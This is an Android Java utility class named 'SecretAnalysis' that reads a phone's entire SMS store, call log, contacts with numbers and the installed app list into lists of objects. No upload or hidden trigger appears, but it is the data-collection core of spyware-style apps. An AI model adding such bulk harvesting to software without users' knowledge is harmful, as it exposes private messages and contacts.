package yt.com.utils;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.util.Log;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import yt.com.entity.AppInfoBean;
import yt.com.entity.PhoneContact;
import yt.com.entity.SmsInfo;
import yt.com.entity.TelInfoBean;

/**
 * author  : LSM
 * time    : 2017/06/08
 * function:
 * e-mail  : lsmloveu@126.com
 * github  : https://github.com/lsmloveu
 * csdn    : http://blog.csdn.net/csdn_android_lsm
 */

public class SecretAnalysis {
    /**
     * 获取所有短信
     * @return
     */
    public static ArrayList<SmsInfo> getSmsInPhone(Context context) {
        ArrayList<SmsInfo> smsInfosList=new ArrayList<>();
        final String SMS_URI_ALL = "content://sms/";
        try {
            Uri uri = Uri.parse(SMS_URI_ALL);
            String[] projection = new String[] { "_id", "address", "person",
                    "body", "date", "type" };
            Cursor cur = context.getContentResolver().query(uri, projection, null,
                    null, "date desc"); // 获取手机内部短信

            if (cur.moveToFirst()) {
                int index_Address = cur.getColumnIndex("address");
                int index_Person = cur.getColumnIndex("person");
                int index_Body = cur.getColumnIndex("body");
                int index_Date = cur.getColumnIndex("date");
                int index_Type = cur.getColumnIndex("type");

                do {
                    SmsInfo smsInfo=new SmsInfo();
                    String strAddress = cur.getString(index_Address);
                    int     intPerson = cur.getInt(index_Person);
                    String strbody = cur.getString(index_Body);
                    long longDate = cur.getLong(index_Date);
                    int intType = cur.getInt(index_Type);
                    SimpleDateFormat dateFormat = new SimpleDateFormat(
                            "yyyy-MM-dd hh:mm:ss");
                    Date d = new Date(longDate);
                    String strDate = dateFormat.format(d);
                    String strType = "";
                    if (intType == 1) {
                        strType = "接收";
                    } else if (intType == 2) {
                        strType = "发送";
                    } else {
                        strType = "null";
                    }
                    smsInfo.setSmsDate(strDate);
                    smsInfo.setSmsType(strType);
                    smsInfo.setSmsContact(strAddress);
                    smsInfo.setSmsContext(strbody);
                    smsInfosList.add(smsInfo);
                } while (cur.moveToNext());
                if (!cur.isClosed()) {
                    cur.close();
                    cur = null;
                }
            } else {
                //没有短信
            }
        } catch (Exception ex) {
            Log.d("error", ex.getMessage());
        }
        return smsInfosList;
    }

    /**
     * 获取通话记录
     */
    public static ArrayList<PhoneContact> getCallsInPhone(Context context) {
        ArrayList<PhoneContact> phoneContactList=new ArrayList<>();
        String phoneType = "";
        Cursor cursor =null;
        cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                new String[] { CallLog.Calls.DURATION, CallLog.Calls.TYPE, CallLog.Calls.DATE,
                        CallLog.Calls.NUMBER }, null, null, CallLog.Calls.DEFAULT_SORT_ORDER);
        boolean hasRecord = cursor.moveToFirst();
        String strPhone = "";
        String date;
        while (hasRecord) {
            PhoneContact phoneContact=new PhoneContact();
            int type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));
            long duration = cursor.getLong(cursor
                    .getColumnIndex(CallLog.Calls.DURATION));
            strPhone = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
            SimpleDateFormat dateFormat = new SimpleDateFormat(
                    "yyyy-MM-dd hh:mm:ss");
            Date d = new Date(Long.parseLong(cursor.getString(cursor
                    .getColumnIndex(CallLog.Calls.DATE))));
            date = dateFormat.format(d);
            switch (type) {
                case CallLog.Calls.INCOMING_TYPE:
                    phoneType="呼入";
                    break;
                case CallLog.Calls.OUTGOING_TYPE:
                    phoneType="呼出";
                default:
                    break;
            }
            phoneContact.setTalkContact(strPhone);
            phoneContact.setTalkDate(date);
            phoneContact.setTalkType(phoneType);
            phoneContact.setTalkTime(String.valueOf(duration));
            phoneContactList.add(phoneContact);
            hasRecord = cursor.moveToNext();
        }
        return phoneContactList;
    }
    /**
     * 获取联系人
     */
    public static ArrayList<TelInfoBean>    getContact(Context context) {
        ArrayList<TelInfoBean> telInfoBeanList=new ArrayList<>();
        ContentResolver resolver = context.getApplicationContext().getContentResolver();
        Cursor cursor = resolver.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);
        while (cursor.moveToNext()) {
            // 取得联系人的名字索引
            int nameIndex = cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME);
            TelInfoBean telInfoBean=new TelInfoBean();
            String contact = cursor.getString(nameIndex);
            telInfoBean.setTelName(contact);
            // 取得联系人的ID索引值
            String contactId = cursor.getString(cursor
                    .getColumnIndex(ContactsContract.Contacts._ID));
            // 查询该位联系人的电话号码，类似的可以查询email，photo
            Cursor phone = resolver.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = "
                            + contactId, null, null);// 第一个参数是确定查询电话号，第三个参数是查询具体某个人的过滤值
            // 一个人可能有几个号码
            String strPhoneNumber="";
            while (phone.moveToNext()) {
                strPhoneNumber += phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))+",";
            }
            if(strPhoneNumber.equals(""))   {
                strPhoneNumber="null,";
            }
            telInfoBean.setTelNum(strPhoneNumber.substring(0,strPhoneNumber.length()-1));
            telInfoBeanList.add(telInfoBean);
            phone.close();
        }
        cursor.close();
        // 设置显示内容
        return  telInfoBeanList;
    }

    //获取全部应用
    public static ArrayList<AppInfoBean> getAppInfo(Context context)    {
        ArrayList<AppInfoBean> appInfoBeanList=new ArrayList<>();
       //获取全部应用：
        PackageManager packageManager = context.getPackageManager();
        Intent mIntent = new Intent(Intent.ACTION_MAIN, null);
        mIntent.addCategory(Intent.CATEGORY_LAUNCHER);
        List<ResolveInfo> listAllApps = packageManager.queryIntentActivities(mIntent, 0);
        //判断是否系统应用：
        for (int i=0; i<listAllApps.size(); i++) {
            AppInfoBean appInfoBean=new AppInfoBean();
            ResolveInfo appInfo = listAllApps.get(i);
            String pkgName = appInfo.activityInfo.packageName;//获取包名
            String appName=appInfo.loadLabel(packageManager).toString();
            appInfoBean.setAppName(appName);
            //根据包名获取PackageInfo mPackageInfo;（需要处理异常）
            try {
                PackageInfo packageInfo=context.getPackageManager().getPackageInfo(pkgName, 0);

                if ((packageInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) <= 0) {
                    //第三方应用
                    appInfoBean.setAppType("3");
                } else {
                    //系统应用
                    appInfoBean.setAppType("1");
                }
            } catch (Exception e) {
            }
            appInfoBeanList.add(appInfoBean);
        }
        return  appInfoBeanList;
    }
}
